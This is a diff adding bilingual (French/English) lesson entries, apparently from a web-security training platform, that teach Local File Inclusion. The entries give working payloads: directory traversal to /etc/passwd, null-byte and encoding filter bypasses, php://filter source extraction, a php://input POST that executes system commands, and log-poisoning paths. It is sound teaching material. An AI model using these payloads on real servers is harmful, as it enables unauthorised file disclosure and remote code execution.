@@ -1,0 +1,294 @@
+[Intro]
+id=intro
+category=lfi
+title="Inclusion de Fichier Local (LFI)"
+desc="
+"
+title_en="Local File Inclusion (LFI)"
+desc_en="
+"
+
+
+
+[LFI]
+id=LFI
+category=lfi
+keywords=
+chall=TrainingLFISimple
+title=LFI
+desc="
+De nombreux langages de programmations, comme le php, sont capable de lire des fichiers et les interpréter pour générer des pages HTML dynamiques.<br/>
+Cette fonction peut être détournée si elle prend en entrée une variable modifiable par l'utilisateur.<br/>
+<br/>
+Par exemple:<br/>
+L'url http://10.10.10.11/index.php?page=login.php est envoyée au serveur.<br/>
+A la réception de cette requête, le serveur va inclure le fichier 'login.php', et l'éxécuter pour générer la page de login.<br/>
+ <br/>
+Nous allons remplacer 'login.php' par le nom d'un autre fichier, par exemple '/etc/passwd'.<br/>
+
+```
+http://10.10.10.11/index.php?page=/etc/password
+```
+"
+title_en=LFI
+desc_en="
+Many programming languages, such as php, are able to read files and process them to generate dynamic HTML pages.<br/>
+This feature can be hijacked by user crafted variable.<br/>
+ <br/>
+For exemple:<br/>
+The URI http://10.10.10.11/index.php?page=login.php is sent to the server.
+The server receive the request extract the page field 'login.php' and process this file to generate the HTML login page.
+ 
+Let replace 'login.php' by another file such as '/etc/passwd', that will be processed by php.
+```
+http://10.10.10.11/index.php?page=/etc/password
+```
+Php commands are enclosed between &lt;?php and ?> tags. When parsing a file without those tags, php simply print the file content.
+"
+
+
+
+[LFI..]
+id=FLI..
+category=lfi
+keywords=
+chall=TrainingLFIRoot
+title=LFI: Accéder à /
+desc="
+Le serveur web apache fonctionne généralement dans le répertoire /var/www/html.<br/>
+Si nous précisons page=/etc/passwd, le serveur risque de chercher le fichier /var/www/html/etc/passwd. <br/>
+Nous utilisons alors /../ pour remonter d'un répertoire.<br/>
+
+<pre><code>/var/www/html/../etc/passwd => /var/www/etc/passwd.
+/var/www/html/../../etc/passwd => /var/etc/passwd.
+</code></pre>
+
+Nous utilisons une série de ../../../../../ devant le nom du fichier pour forcer le serveur à redescendre au niveau de la racine des répertoires.<br/>
+/var/www/html/../../../../../../../ vaut /, quel que soit le nombre de ../<br/>
+
+
+<pre><code>http://10.10.10.11?page=../../../../../etc/passwd
+</code></pre>
+Une LFI permet de lire TOUS les fichiers de la machine accessible au compte du serveur web.
+"
+title_en=LFI: Access /
+desc_en="
+Apache web server working directory is usually /var/www/html.<br/>
+Setting page=/etc/passwd, the server tries to open the file /var/www/html/etc/passwd. <br/>
+Let add /../ to the path to reach the upper directory.<br/>
+
+<pre><code>/var/www/html/../etc/passwd => /var/www/etc/passwd.
+/var/www/html/../../etc/passwd => /var/etc/passwd.
+</code></pre>
+We can add as many  ../../../../../ as we want, we can't go upper than /.<br/>
+/var/www/html/../../../../../../../ => /, regardless of the number of ../<br/>
+
+<pre><code>http://10.10.10.11?page=../../../../../etc/passwd
+</code></pre>
+An LFI can read/execute ALL files, the web server account is allowed to read.
+"
+
+
+[LFINull]
+id=LFINull
+category=lfi
+keywords=
+chall=TrainingLFINull
+title="NUll byte"
+desc="
+Le serveur extrait le paramètre 'page' de la requète http://10.10.10.11/index.php?page=login, et ajoute l'extension '.php' avant d'inclure le fichier.<br/>
+<br/>
+http://10.10.10.11/index.php?page=/etc/password va essayer d'ouvrir sans success /etc/password.php.<br/>
+<br/>
+Sur les version de php antérieures à 5.3.4, l'ajout d'un null byte à la fin de notre paramètre va signifier la fin de la chaine de caractère, et conduit à ignorer l'extension '.php'.<br/>
+<pre><code>http://10.10.10.11/index.php?page=/etc/password%00
+</code></pre>
+
+"
+title_en="NUll byte"
+desc_en="
+The server extracts 'page' parameter from request http://10.10.10.11/index.php?page=login, and appends an extension such as '.php' before including it.<br/>
+<br/>
+http://10.10.10.11/index.php?page=/etc/password tries without succes to open /etc/password.php.<br/>
+<br/>
+On php version older than 5.3.4, adding a null byte at the end of our parameter will mean the end of the string, and leads to ignoring the extension '.php'.<br/>
+<pre><code>http://10.10.10.11/index.php?page=/etc/password%00
+</code></pre>
+"
+
+
+
+[LFIURLDoubleEncodage]
+id=LFIURLDoubleEncodage
+category=lfi
+keywords=
+title="Double encodage d'URL"
+title_en="URL double encoding"
+desc="
+```
+<   %3C %253C
+>   %3E %253E
+«   %22 %2522
+‘   %27 %2527
+/   %2F %252F
+.   %2E %252E
+=   %3D %253D
+–   %2D %252D
+:   %3A %253A
+```
+    "
+
+
+[LFIWaf]
+id=LFIWaf
+category=lfi
+keywords=
+chall=TrainingLFIWafSimple
+title=WAF: Filtres applicatifs
+desc="
+Les développeurs ayant conscience des risques de LFI peuvent ajouter des fonctions qui vont filtrer les entrées.<br/>
+Ils vont supprimer les ../ et les / dans le nom du fichier<br/>
+Ce genre de filtre s'appelle un Waf : Web Application Filter.<br/>
+<br/>
+Il est possible de contourner ces filtres de plusieures manières:<br/>
+- En prévoyant que des suites de caractères seront filtrés: ..././ une fois filtré va donner ../<br/>
+http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
+ <br/>
+- En utilisant un encodage url:<br/>
+../ devient %2e%2e%2f<br/>
+/ devient %2f<br/>
+http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>    
+<br/>
+- En utilisant un double encodage url:<br/>
+../ devient %2e%2e%2f qui lui même devient %252e%252e%252f<br/>
+/ devient %252f<br/>
+http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
+<br/>
+Même si généralement les navigateurs ne ralent pas trop, ils peuvent interpréter les caractères encodés voire les réencoder. Il est souvent préférable de modifier l'URL dans une command curl ou un proxy plutôt que dans le navigateur.
+"
+
+title_en=WAF: Web Application Filter
+desc_en="
+Developers, who are aware of the risks of LFI, sometime add functions that will filter the entries.<br/>
+They detect and remove the ../ and the / in the filename<br/>.
+This kind of filter is called a Waf: Web Application Filter.<br/>
+<br/>
+It is possible to bypass these filters in several ways:<br/>
+- By providing the sequences of characters that will be filtered out: ..././ once filtered becomes ../<br/>
+http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
+ <br/>
+- Using url encoding:<br/>
+%2e%2e%2f instead of ../<br/>
+%2f instead of /<br/>
+http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>    
+<br/>
+- Using a double url encoding:<br/>
+../ => %2e%2e%2f => %252e%252e%252f<br/>
+http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
+<br/>
+
+Browsers could interpret the encoded characters or even re-encode them. It is usually better to set the desired URL thanks to a curl command or modify/replay using an HTTP proxy.
+"
+
+
+[LFIphpfilter]
+id=LFIphpfilter
+category=lfi
+keywords=
+chall=TrainingLFIphpfilter
+title=Php:filter : Recupérer les codes sources php
+desc="
+Le langage php offre la possibilité de passer les fichiers dans des filtres avant de les ouvrir. Il est ainsi possible d'encoder un fichier en base64 avant de l'ouvrir.
+````
+http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php 
+http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php 
+````
+Il ne reste plus qu'à décoder pour obtenir le code source du fichier php.
+"
+title_en=Php:filter: Get php sources
+desc_en="
+Php allows to pass files through filters before opening them. It is thus possible to encode a file in base64 before opening it.
+````
+http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php 
+http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php 
+````
+It only remains to decode base64 to get the source code of the file.
+"
+
+[LFIphpinput]
+id=LFIphpinput
+category=lfi
+keywords=
+chall=
+title=Php:input : Injecter du code via un Post HTTP
+desc="
+Le langage php permet de traiter le contenu de la requête HTTP comme un fichier. Il est ainsi possible de lire et faire executer le contenu brut des données en POST avec php://input.<br/>
+
+curl  -X POST -d 'test=&lt;? system (&quot;id&quot;); ?>' http://pwnlab/?page=php://input<br/>
+<br/>
+Ne fonctionne que si l'option allow_url_include = On est active dans la config php. Cette est désactivée par défaut.
+"
+title_en=Php:input : Code injection in an HTTP Post
+desc_en="
+Php allows to read the content of the HTTP request as a file. It is thus possible to read and execute the raw content of the data in POST with php://input.<br/>
+
+curl  -X POST -d 'test=&lt;? system (&quot;id&quot;); ?>' http://pwnlab/?page=php://input<br/>
+
+Only works if the option allow_url_include = On is active in the php config. This option is disabled by default.
+"
+
+
+[LFILog]
+id=FLILog
+category=lfi
+keywords=
+title=Exploitation des logs
+desc="
+Pour injecter une payload Php dans le fichier de logs d'un serveur web, il suffit de faire une requête de type HTTP GET contenant du code php dans l'url.<br/>
+Pour un serveur ftp ou ssh, injecter la payload dans le login.
+Nous utilisons ensuite une LFI sur le fichier de log pour déclencher l'execution de la payload.<br/>
+<br/>
+Fichiers de logs usuels:<br/>
+Apache<br/>
+/var/log/apache/access.log<br/>
+/var/log/apache/error.log<br/>
+/usr/local/apache/log/error_log<br/>
+/usr/local/apache2/log/error_log<br/>
+/var/log/httpd/error_log<br/>
+<br/>
+Nginx<br/>
+/var/log/nginx/access.log<br/>
+/var/log/nginx/error.log<br/>
+<br/>
+Ssh<br/>
+/var/log/sshd.log<br/>
+<br/>
+Il est possible de vérifier l'emplacement des fichiers de logs en lisant les fichiers de config.<br/>
+Fichier de config de Nginx: /etc/nginx/nginx.conf<br/>
+Entrée du fichier de config : access_log /spool/logs/nginx-access.log<br/>
+"
+title_en=Logs Exploitation
+desc_en="
+To inject a Php payload in the log file of a server, just send an HTTP GET request containing php code in the url.<br/>
+For an ssh or ftp server, inject the payload in login.
+Use then an LFI on the log file to trigger the payload.<br/>
+<br/>
+Usual log files locations:<br/>
+Apache<br/>
+/var/log/apache/access.log<br/>
+/var/log/apache/error.log<br/>
+/usr/local/apache/log/error_log<br/>
+/usr/local/apache2/log/error_log<br/>
+/var/log/httpd/error_log<br/>
+<br/>
+Nginx<br/>
+/var/log/nginx/access.log<br/>
+/var/log/nginx/error.log<br/>
+<br/>
+Ssh<br/>
+/var/log/sshd.log<br/>
+<br/>
+Log files location can be found in webservers config files:<br/>
+Nginx: /etc/nginx/nginx.conf<br/>
+Look for : access_log /spool/logs/nginx-access.log<br/>
+"
